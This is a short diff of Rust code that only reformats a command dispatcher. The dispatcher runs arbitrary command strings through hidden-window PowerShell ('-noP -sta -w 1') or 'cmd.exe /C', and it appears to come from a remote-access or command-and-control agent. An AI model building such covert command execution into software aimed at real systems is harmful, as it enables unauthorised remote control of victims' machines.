@@ -78,14 +78,20 @@ fn dispatch(command: &str, parameters: &str) -> String {
             let cmd = link_common::extract_param(parameters, "command");
             let cmd_str = if cmd.is_empty() { parameters } else { &cmd };
             if command == "powershell" {
-                shell_exec("powershell.exe", &["-noP", "-sta", "-w", "1", "-c", cmd_str])
+                shell_exec(
+                    "powershell.exe",
+                    &["-noP", "-sta", "-w", "1", "-c", cmd_str],
+                )
             } else {
                 shell_exec("cmd.exe", &["/C", cmd_str])
             }
         }
         _ => {
             let cmd = link_common::extract_param(parameters, "command");
-            shell_exec("cmd.exe", &["/C", if cmd.is_empty() { parameters } else { &cmd }])
+            shell_exec(
+                "cmd.exe",
+                &["/C", if cmd.is_empty() { parameters } else { &cmd }],
+            )
         }
     }
 }
